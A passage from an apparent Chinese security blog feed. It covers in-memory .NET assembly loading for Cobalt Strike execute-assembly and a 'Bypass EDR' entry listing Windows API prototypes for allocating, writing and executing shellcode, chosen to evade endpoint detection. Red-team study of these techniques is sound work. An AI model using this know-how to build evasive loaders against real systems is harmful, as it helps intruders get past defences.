class="line">);</div></pre></td></tr></table></figure></li><li><p>3) 调用<code>GetInterface</code>获取<code>ICorRuntimeHost</code>或者<code>ICLRRuntimeHost</code>。rclsid为接口的CLSID,riid是接口的iid，ppUnk返回的接口的指针。加载.Net程序集可以使用两种接口<code>ICorRuntimeHost</code>或者<code>ICLRRuntimeHost</code>。使用<code>ICorRuntimeHost</code>的有点是可以兼容V1.0的程序集，但是<code>ICLRRuntimeHost</code>在代码实现上会比较容易。</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">HRESULT GetInterface(  </div><div class="line">[<span class="keyword">in</span>]  REFCLSID rclsid,  </div><div class="line">[<span class="keyword">in</span>]  REFIID   riid,  </div><div class="line">[<span class="keyword">out</span>, iid<span class="number">_</span><span class="keyword">is</span>(riid), retval] LPVOID *ppUnk);</div></pre></td></tr></table></figure></li><li><p>4）启动CLR环境集</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">CLRCreateInstance(<span class="name">CLSID_CLRMetaHost</span>, IID_ICLRMetaHost, (<span class="name">VOID**</span>)<span class="symbol">&amp;iMetaHost</span>)<span class="comment">;</span></div><div class="line">iMetaHost-&gt;GetRuntime(<span class="name">L</span><span class="string">"v4.0.30319"</span>, IID_ICLRRuntimeInfo, (<span class="name">VOID**</span>)<span class="symbol">&amp;iRuntimeInfo</span>)<span class="comment">;</span></div><div class="line">iRuntimeInfo-&gt;GetInterface(<span class="name">CLSID_CorRuntimeHost</span>, IID_ICorRuntimeHost, (<span class="name">VOID**</span>)<span class="symbol">&amp;iRuntimeHost</span>)<span class="comment">;</span></div><div class="line">iRuntimeHost-&gt;Start()<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序域为安全性、可靠性和版本控制以及卸载程序集提供了隔离边界，需要将程序集加载到对应的程序域中，才能执行其中包含的代码，这也就是为啥要获取程序集的原因了。程序集的加载方式决定了它的即时 (JIT) 编译代码是否可以由进程中的多个应用程序域共享，以及程序集是否可以从进程中卸载。具体关于程序域和程序集可以参考<a href="https://learn.microsoft.com/en-us/dotnet/framework/app-domains/application-domains" target="_blank" rel="external">微软关于程序域和程序集的概述</a>，通过调用<code>GetDefaultDomain</code>获取默认的程序集，并通过调用<code>QueryInterface</code>检索该程序集的接口。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">iRuntimeHost-&gt;GetDefaultDomain(<span class="name">&amp;pAppDomain</span>)<span class="comment">;</span></div><div class="line">pAppDomain-&gt;QueryInterface(<span class="name">__uuidof</span>(<span class="name">_AppDomain</span>), (<span class="name">VOID**</span>)<span class="symbol">&amp;pDefaultAppDomain</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在拥有运行时环境CLR，已经可以被托管的容器程序域之后，可以加载程序集了。调用<code>Load_3</code>函数加载程序集安全数组，并获取入口点。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">HRESULT Load_3 (</div><div class="line">    SAFEARRAY* rawAssembly,</div><div class="line">    Assembly **pRetVal )</div><div class="line"></div><div class="line">pDefaultAppDomain-&gt;Load_3(<span class="name">pSafeArray</span>, <span class="symbol">&amp;pAssembly</span>)<span class="comment">;</span></div><div class="line">pAssembly-&gt;get_EntryPoint(<span class="name">&amp;pMethodInfo</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后，调用Invoke_3执行程序集的入口点。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HRESULT hr = pMethodInfo-&gt;Invoke_3(<span class="name">vObj</span>, args, <span class="symbol">&amp;vRet</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p><h2 id="0x09-参考"><a href="#0x09-参考" class="headerlink" title="0x09 参考"></a>0x09 参考</h2><ul><li><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm" target="_blank" rel="external">官方文档-Beacon Object Files</a></li><li><a href="https://www.trustedsec.com/blog/a-developers-introduction-to-beacon-object-files/" target="_blank" rel="external">A DEVELOPER’S INTRODUCTION TO BEACON OBJECT FILES</a></li><li><a href="https://www.freebuf.com/articles/network/282744.html" target="_blank" rel="external">CobaltStirke BOF技术剖析（一）｜BOF实现源码级分析</a></li><li><a href="https://idiotc4t.com/weaponization/bof-weaponization" target="_blank" rel="external">https://idiotc4t.com/weaponization/bof-weaponization</a></li><li><a href="https://idiotc4t.com/defense-evasion/cobaltstrike-executeassembly-realization" target="_blank" rel="external">Execute-Assembly实现</a></li><li><a href="https://3gstudent.github.io/从内存加载.NET程序集(execute-assembly" target="_blank" rel="external">从内存加载.NET程序集的利用分析</a>的利用分析)</li><li><a href="https://learn.microsoft.com/en-us/dotnet/standard/clr" target="_blank" rel="external">微软关于CLR的描述</a></li><li><a href="https://learn.microsoft.com/en-us/dotnet/framework/app-domains/application-domains" target="_blank" rel="external">微软关于程序域和程序集的概述</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;本文首发于跳跳糖安全社区&lt;a href=&quot;https://tttang.com/archive/1786/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://tttang.com/archive/1786/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>Bypass EDR</title>
    <link href="https://findream.github.io/2022/11/25/Bypass%20EDR%20and%20AV/"/>
    <id>https://findream.github.io/2022/11/25/Bypass EDR and AV/</id>
    <published>2022-11-25T12:45:11.000Z</published>
    <updated>2023-05-03T13:59:01.133Z</updated>
    
    <content type="html"><![CDATA[<ul><li>主要记载了常见的Bypass EDR的方法。</li></ul><a id="more"></a><h3 id="0x01-API函数总结"><a href="#0x01-API函数总结" class="headerlink" title="0x01 API函数总结"></a>0x01 API函数总结</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;敏感的API函数调用容易被EDR检测，如果使用不常使用的API函数可以减少被EDR产品检测的可能性。参考文章：<a href="https://github.com/ReversingID/Shellcode-Loader" target="_blank" rel="external">https://github.com/ReversingID/Shellcode-Loader</a></p><ul><li><p>allocation：</p><ul><li><p>AllocADsMem</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">LPVOID AllocADsMem (<span class="name">DWORD</span> cb)<span class="comment">;</span></div><div class="line">BOOL FreeADsMem (<span class="name">LPVOID</span> pMem)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>CoTaskMemAlloc</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">LPVOID CoTaskMemAlloc (<span class="name">SIZE_T</span> cb)<span class="comment">;</span></div><div class="line">void CoTaskMemFree (<span class="name">LPVOID</span> pv)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>CreateFileMapping  /MapViewOfFile / MapViewOfFileEx / MapViewOfFile2 / MapViewOfFile3</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">HANDLE CreateFileMappingA (<span class="name">HANDLE</span> hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName)<span class="comment">;</span></div><div class="line">HANDLE CreateFileMappingW (<span class="name">HANDLE</span> hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName)<span class="comment">;</span></div><div class="line">LPVOID MapViewOfFile (<span class="name">HANDLE</span> hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap)<span class="comment">;</span></div><div class="line">LPVOID MapViewOfFileEx (<span class="name">HANDLE</span> hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap, LPVOID lpBaseAddress)<span class="comment">;</span></div><div class="line">PVOID MapViewOfFile2 (<span class="name">HANDLE</span> FileMappingHandle, HANDLE ProcessHandle, ULONG64 Offset, PVOID BaseAddress, SIZE_T ViewSize, ULONG AllocationType, ULONG PageProtection)<span class="comment">;</span></div><div class="line">PVOID MapViewOfFile3 (<span class="name">HANDLE</span> FileMapping, HANDLE Process, PVOID BaseAddress, ULONG64 Offset, SIZE_T ViewSize, ULONG AllocationType, ULONG PageProtection, MEM_EXTENDED_PARAMETER ExtendedParameters, ULONG ParameterCount)<span class="comment">;</span></div><div class="line">PVOID MapViewOfFileNuma2 (<span class="name">HANDLE</span> FileMappingHandle, HANDLE ProcessHandle, ULONG64 Offset, PVOID BaseAddress, SIZE_T ViewSize, ULONG AllocationType, ULONG PageProtection, ULONG PreferredNode)<span class="comment">;</span></div><div class="line">BOOL UnmapViewOfFile (<span class="name">LPCVOID</span> lpBaseAddress)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>GlobalAlloc_GHND</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">HGLOBAL GlobalAlloc (<span class="name">UINT</span> uFlags, SIZE_T dwBytes)<span class="comment">;</span></div><div class="line">LPVOID GlobalLock (<span class="name">HGLOBAL</span> hMem)<span class="comment">;</span></div><div class="line">BOOL GlobalUnlock (<span class="name">HGLOBAL</span> hMem)<span class="comment">;</span></div><div class="line">HGLOBAL GlobalFree (<span class="name">HGLOBAL</span> hMem)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>GlobalAlloc_GPTR</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">HGLOBAL GlobalAlloc (<span class="name">UINT</span> uFlags, SIZE_T dwBytes)<span class="comment">;</span></div><div class="line">HGLOBAL GlobalFree (<span class="name">HGLOBAL</span> hMem)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>HeapAlloc</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">LPVOID HeapAlloc (<span class="name">HANDLE</span> hHeap, DWORD dwFlags, SIZE_T dwBytes)<span class="comment">;</span></div><div class="line">HANDLE HeapCreate (<span class="name">DWORD</span> flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)<span class="comment">;</span></div><div class="line">BOOL HeapFree (<span class="name">HANDLE</span> hHeap, DWORD dwFlags, _Frees_ptr_opt_ LPVOID lpMem)<span class="comment">;</span></div><div class="line">BOOL HeapDestroy (<span class="name">HANDLE</span> hHeap)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>NtAllocateVirtualMemory</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">NTSTATUS NtAllocateVirtualMemory (HANDLE ProcessHandle, PVOID <span class="keyword">BaseAddress, </span>ULONG ZeroBits, PULONG RegionSize, ULONG AllocationType, ULONG Protect)<span class="comment">;</span></div><div class="line">NTSTATUS NtProtectVirtualMemory (HANDLE ProcessHandle, PVOID * <span class="keyword">BaseAddress, </span>PULONG NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection)<span class="comment">;</span></div><div class="line">NTSTATUS NtFreeVirtualMemory (HANDLE ProcessHandle, PVOID * <span class="keyword">BaseAddress, </span>PULONG RegionSize, ULONG FreeType)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>NtCreateSection</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">NTSTATUS NtCreateSection (PHANDLE SectionHandle, <span class="built_in">ULONG</span> DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, <span class="built_in">ULONG</span> PageAttributess, <span class="built_in">ULONG</span> SectionAttributes, HANDLE FileHandle);</div><div class="line">NTSTATUS NtMapViewOfSection (HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress, <span class="built_in">ULONG</span> ZeroBits, <span class="built_in">ULONG</span> CommitSize, PLARGE_INTEGER SectionOffset, PULONG ViewSize, DWORD InheritDisposition, <span class="built_in">ULONG</span> AllocationType, <span class="built_in">ULONG</span> Protect);</div><div class="line">NTSTATUS NtUnmapViewOfSection (HANDLE ProcessHandle, PVOID BaseAddress);</div><div class="line">NTSTATUS NtClose (HANDLEObjectHandle);</div></pre></td></tr></table></figure></li><li><p>NtCreateSectionEx</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">NTSTATUS NtCreateSectionEx (PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, <span class="built_in">ULONG</span> SectionPageProtection, <span class="built_in">ULONG</span> AllocationAttributes, HANDLE FileHandle, PMEM_EXTENDED_PARAMETER ExtendedParameters, <span class="built_in">ULONG</span> ExtendedParameterCount);</div><div class="line">NTSTATUS NtMapViewOfSectionEx (HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress, <span class="built_in">ULONG</span> ZeroBits, <span class="built_in">ULONG</span> CommitSize, PLARGE_INTEGER SectionOffset, PULONG ViewSize, DWORD InheritDisposition, <span class="built_in">ULONG</span> AllocationType, <span class="built_in">ULONG</span> Protect);</div><div class="line">NTSTATUS NtUnmapViewOfSectionEx (HANDLE ProcessHandle, PVOID BaseAddress);</div><div class="line">NTSTATUS NtClose (HANDLEObjectHandle);</div></pre></td></tr></table></figure></li><li><p>RtlAllocateHeap</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PVOID RtlAllocateHeap (<span class="name">PVOID</span> HeapHandle, ULONG Flags, SIZE_T Size)<span class="comment">;</span></div><div class="line">PVOID RtlCreateHeap (<span class="name">ULONG</span> Flags, PVOID HeapBase, SIZE_T ReserveSize, SIZE_T CommitSize, PVOID Lock, PRTL_HEAP_PARAMETERS Parameters)<span class="comment">;</span></div><div class="line">LOGICAL RtlFreeHeap (<span class="name">PVOID</span> HeapHandle, ULONG Flags, PVOID BaseAddress)<span class="comment">;</span></div><div class="line">PVOID RtlDestroyHeap (<span class="name">PVOID</span> HeapHandle)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>VirtualAlloc</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">LPVOID VirtualAlloc (<span class="name">LPVOID</span> lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)<span class="comment">;</span></div><div class="line">BOOL VirtualProtect (<span class="name">LPVOID</span> lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect)<span class="comment">;</span></div><div class="line">BOOL VirtualFree(<span class="name">LPVOID</span> lpAddress, SIZE_T dwSize, DWORD dwFreeType)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>VirtualAlloc2</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">LPVOID VirtualAlloc2(HANDLE Process, PVOID <span class="keyword">BaseAddress, </span>SIZE_T Size, ULONG AllocationType, ULONG PageProtection, MEM_EXTENDED_PARAMETER <span class="keyword">ExtendedParameters, </span>ULONG ParameterCount)<span class="comment">;</span></div><div class="line"><span class="keyword">BOOL </span>VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect)<span class="comment">;</span></div><div class="line"><span class="keyword">BOOL </span>VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>VirtualAllocEx</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">LPVOID VirtualAllocEx(<span class="name">HANDLE</span> hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD flProtect)<span class="comment">;</span></div><div class="line">BOOL VirtualProtectEx(<span class="name">HANDLE</span> hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect)<span class="comment">;</span></div><div class="line">BOOL VirtualFreeEx(<span class="name">HANDLE</span> hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType)<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul></li><li><p>execution</p><ul><li><p>callback</p><ul><li><p>CallWindowProc</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">LRESULT CallWindowProcA (WNDPROC lpPrevWndFunc, <span class="keyword">HWND</span> <span class="keyword">hWnd</span>, UINT Msg, <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>, <span class="keyword">LPARAM</span> <span class="keyword">lParam</span>)<span class="comment">;</span></div><div class="line">LRESULT CallWindowProcW (WNDPROC lpPrevWndFunc, <span class="keyword">HWND</span> <span class="keyword">hWnd</span>, UINT Msg, <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>, <span class="keyword">LPARAM</span> <span class="keyword">lParam</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>CopyFile2</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HRESULT CopyFile2 (<span class="name">PCWSTR</span> pwszExistingFileName, PCWSTR pwszNewFileName, COPYFILE2_EXTENDED_PARAMETERS pExtendedParameters)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>eg….</p></li></ul></li><li><p>event</p><ul><li><p>CreateThreadpoolTimer</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PTP_TIMER CreateThreadpoolTimer(PTP_TIMER_CALLBACK pfnti, PVOID pv, PTP_CALLBACK_ENVIRON pcbe)<span class="comment">;</span></div><div class="line">void SetThreadpoolTimer(PTP_TIMER pti, PFILETIME pftDueTime, DWORD msPeriod, DWORD msWindowLength)<span class="comment">;</span></div><div class="line">HANDLE CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, <span class="keyword">BOOL </span><span class="keyword">bManualReset, </span><span class="keyword">BOOL </span><span class="keyword">bInitialState, </span>LPCSTR lpName)<span class="comment">;</span></div><div class="line">DWORD <span class="keyword">WaitForSingleObject </span>(HANDLE hHandle, DWORD dwMilliseconds)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>CreateTimerQueue</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">HANDLE CreateTimerQueue ()<span class="comment">;</span></div><div class="line"><span class="keyword">BOOL </span>CreateTimerQueueTimer(PHANDLE phNewTimer, HANDLE TimerQueue, <span class="keyword">WAITORTIMERCALLBACK </span>Callback, PVOID Parameter, DWORD DueTime, DWORD Period, ULONG Flags)<span class="comment">;</span></div><div class="line">HANDLE CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, <span class="keyword">BOOL </span><span class="keyword">bManualReset, </span><span class="keyword">BOOL </span><span class="keyword">bInitialState, </span>LPCSTR lpName)<span class="comment">;</span></div><div class="line">DWORD <span class="keyword">WaitForSingleObject </span>(HANDLE hHandle, DWORD dwMilliseconds)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>QueueUserAPC</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">DWORD QueueUserAPC(<span class="name">PAPCFUNC</span> pfnAPC, HANDLE hThread, ULONG_PTR dwData)<span class="comment">;</span></div><div class="line">NTSTATUS NtTestAlert()<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul></li><li><p>exception</p><ul><li><p>AddVectoredExceptionhandler</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function">PVOID <span class="title">AddVectoredExceptionHandler</span> <span class="params">(ULONG First, PVECTORED_EXCEPTION_HANDLER Handler)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">RaiseException</span> <span class="params">(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, <span class="keyword">const</span> ULONG_PTR *lpArguments)</span></span>;</div><div class="line"><span class="function">ULONG <span class="title">RemoveVectoredExceptionHandler</span> <span class="params">(PVOID Handle)</span></span>;</div></pre></td></tr></table></figure></li><li><p>SetUnhandledExceptionFilter</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">SetUnhandledExceptionFilter</span></div></pre></td></tr></table></figure></li></ul></li><li><p>fiber(纤程)</p><ul><li><p>CreateFiber</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">LPVOID CreateFiber(<span class="name">SIZE_T</span> dwStackSize, LPFIBER_START_ROUTINE lpStartAddress, LPVOID lpParameter)<span class="comment">;</span></div><div class="line">LPVOID ConvertThreadToFiber(<span class="name">LPVOID</span> lpParameter)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>CreateFiberEx</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">LPVOID CreateFiberEx (<span class="name">SIZE_T</span> dwStackCommitSize, SIZE_T dwStackReserveSize, LPFIBER_START_ROUTINE lpStartAddress, LPVOID lpParameter)<span class="comment">;</span></div><div class="line">LPVOID ConvertThreadToFiber(<span class="name">LPVOID</span> lpParameter)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>FlsAlloc</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">DWORD FlsAlloc (<span class="name">PFLS_CALLBACK_FUNCTION</span> lpCallback)<span class="comment">;</span></div><div class="line">BOOL FlsSetValue (<span class="name">DWORD</span> dwFlsIndex, PVOID lpFlsData)<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul></li><li><p>invoke</p></li><li><p>thread</p><ul><li>CreateThread</li><li>CreateThreadEx</li><li>NtCreateThread</li><li>CreateRemoteThread</li><li><p>EtwCreateEtwThread</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">HANDLE EtwpCreateEtwThread (<span class="name">LPVOID</span> routine, LPVOID param)<span class="comment">;</span></div><div class="line">DWORD WaitForSingleObject (<span class="name">HANDLE</span> hHandle, DWORD dwMilliseconds)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>RtlCreateUserThread</p></li><li><p>SHCreateThread</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOL </span><span class="keyword">SHCreateThread </span>(LPTHREAD_START_ROUTINE pfnThreadProc, void * pData, <span class="keyword">SHCT_FLAGS </span>flags, LPTHREAD_START_ROUTINE pfnCallback)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>SHCreateThreadWithHandle</p></li></ul></li></ul></li><li><p>permission</p><ul><li><p>NtProtectVirtualMemory</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">NTSTATUS NtProtectVirtualMemory (HANDLE ProcessHandle, PVOID * <span class="keyword">BaseAddress, </span>PULONG NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>VirtualProtect</p></li><li>VirtualProtectEx</li></ul></li><li><p>writing</p><ul><li>compression / decompress</li><li><p>conversion(压缩)</p><ul><li><p>RtlEthernetStringToAddress</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NTSTATUS RtlEthernetStringToAddressA (<span class="name">PCSTR</span> S, PCSTR * Terminator, DL_EUI48 * Addr)<span class="comment">;</span></div><div class="line">NTSTATUS RtlEthernetStringToAddressW ( <span class="name">PCWSTR</span> S, LPCWSTR * Terminator, DL_EUI48 * Addr)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>RtlIpv4StringToAddress</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NTSTATUS RtlIpv4StringToAddressA (<span class="name">PCSTR</span> S, BOOLEAN Strict, PCSTR * Terminator, in_addr * Addr)<span class="comment">;</span></div><div class="line">NTSTATUS RtlIpv4StringToAddressW ( <span class="name">PCWSTR</span> S, BOOLEAN Strict, LPCWSTR * Terminator, in_addr * Addr)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>RtlIpv4StringToAddressEx</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">NTSTATUS</span> RtlIpv4StringToAddressExA (PCSTR <span class="keyword">AddressString, </span><span class="keyword">BOOLEAN </span><span class="keyword">Strict, </span>in_addr *<span class="keyword">Address, </span><span class="keyword">PUSHORT </span>Port)<span class="comment">;</span></div><div class="line"><span class="symbol">NTSTATUS</span> RtlIpv4StringToAddressExW (PCWSTR <span class="keyword">AddressString, </span><span class="keyword">BOOLEAN </span><span class="keyword">Strict, </span>in_addr *<span class="keyword">Address, </span><span class="keyword">PUSHORT </span>Port)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>RtlIpv6StringToAddress</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NTSTATUS RtlIpv6StringToAddressA (<span class="name">PCSTR</span> S, PCSTR * Terminator, in6_addr * Addr)<span class="comment">;</span></div><div class="line">NTSTATUS RtlIpv6StringToAddressW ( <span class="name">PCWSTR</span> S, LPCWSTR * Terminator, in6_addr * Addr)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>UuidFromString</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">RPC_STATUS UuidFromStringA (<span class="name">RPC_CSTR</span> StringUuid, UUID *Uuid);</div><div class="line">RPC_STATUS UuidFromStringW (RPC_WSTR StringUuid, UUID *Uuid)<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul></li><li><p>copy</p><ul><li>CopyMemory</li><li>CreatePipe/WriteFile/ReadFile</li><li>MoveMemory</li><li>NtWriteVirtualMemory</li><li>RtlMoveMemory</li><li>WriteProcessMemory</li><li>memcpy</li></ul></li></ul></li></ul><h3 id="0x02-加密算法"><a href="#0x02-加密算法" class="headerlink" title="0x02 加密算法"></a>0x02 加密算法</h3><ul><li>对称加密算法</li></ul><h3 id="0x03-syscall技术以及运行时解析"><a href="#0x03-syscall技术以及运行时解析" class="headerlink" title="0x03 syscall技术以及运行时解析"></a>0x03 syscall技术以及运行时解析</h3><ul><li><a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" rel="external">https://github.com/jthuraisamy/SysWhispers2</a></li><li><a href="https://tttang.com/archive/1464/" target="_blank" rel="external">syscall的前世今生</a></li></ul><h3 id="0x04-VEH联合syscall打乱栈回溯"><a href="#0x04-VEH联合syscall打乱栈回溯" class="headerlink" title="0x04 VEH联合syscall打乱栈回溯"></a>0x04 VEH联合syscall打乱栈回溯</h3><ul><li><a href="https://github.com/Dec0ne/HWSyscalls" target="_blank" rel="external">https://github.com/Dec0ne/HWSyscalls</a></li></ul><h3 id="0x05-使用未被EDR产品检测的高级注入技术"><a href="#0x05-使用未被EDR产品检测的高级注入技术" class="headerlink" title="0x05 使用未被EDR产品检测的高级注入技术"></a>0x05 